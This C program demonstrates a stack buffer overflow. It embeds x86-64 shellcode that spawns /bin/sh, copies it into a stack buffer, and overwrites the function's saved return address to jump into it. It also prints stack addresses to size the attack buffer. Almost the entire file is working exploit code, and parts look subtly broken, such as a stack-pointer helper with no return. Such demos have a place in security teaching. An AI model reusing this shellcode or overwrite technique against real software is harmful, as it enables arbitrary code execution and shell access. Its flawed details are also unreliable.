#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long long *hold;

int i;

// Shellcode to open /bin/sh (written in hex)
char shellcode[] =
  "\x48\x31\xc0"
  "\x50"
  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
  "\x53"
  "\x48\x89\xe7"
  "\x50"
  "\x57"
  "\x48\x89\xe6"
  "\xb0\x3b"
  "\x0f\x05";

// Returns the current stack pointer
unsigned long long get_sp(void)
{
  __asm__("movq %rsp,%rax");
}

void dumb(char *arg)
{
  long long *test;
  hold = (unsigned long long *)&test;

  char filename[1024]; // buffer on stack

  // Print addresses for debugging
  printf("\nValue of Test:%llx", (unsigned long long)&test);
  printf("\nValue of filename[0]:%llx\n", (unsigned long long)filename);
  printf("The attack buffer is going to need to be a little bit bigger than:%llx\n", 
         ((unsigned long long)test - (unsigned long long)filename));

  // Copy shellcode to stack
  strcpy(filename, shellcode);

  // Overwrite return address to point to shellcode
  unsigned long long *ret_ptr = (unsigned long long *)((char *)filename + 1032);
  *ret_ptr = (unsigned long long)filename;

  return;
}

int main(int argc, char *argv[])
{
  char holding[10000]; // buffer to avoid corrupting main’s return address
  char *string;
  string = argv[1];

  unsigned long long stack;
  stack = get_sp();

  if (argc > 1)
  {
    printf("\\Length of Input String:%d\\", (int)strlen(string));
    dumb(argv[1]);
  }
  else
  {
    printf("\n\nError: No Command Line arg for vuln was given\n\n");
    dumb(shellcode);
  }

  return 0;
}
